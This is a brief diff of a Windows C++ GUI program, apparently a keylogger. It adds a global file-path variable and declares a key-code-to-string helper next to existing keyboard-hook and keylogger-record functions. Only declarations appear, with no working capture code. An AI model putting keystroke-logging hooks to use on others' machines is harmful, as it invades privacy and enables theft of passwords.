@@ -50,6 +50,9 @@ HWND hEditControl;								// Поле ввода
 HWND hComboBox;									// Выпадающее меню
 char filename[MAX_PATH];						// Для хранения пути к выбранному файлу
 
+char globalFilePath[MAX_PATH] = { 0 };  // Глобальная переменная для хранения пути к файлу
+
+
 OPENFILENAMEA ofn;								// Структура для диалога открытия файла
 HINSTANCE hInst;                                // Текущий экземпляр
 WCHAR szTitle[MAX_LOADSTRING];                  // Текст строки заголовка
@@ -83,6 +86,7 @@ void CreateFileInSelectedFolder(HWND hwnd);
 
 void LoadKeyloggerRecordsFromFile(HWND hwnd);
 
+wstring GetKeyStringFromCode(int keyCode);
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 void SetKeyboardHook();
 void RemoveKeyboardHook();
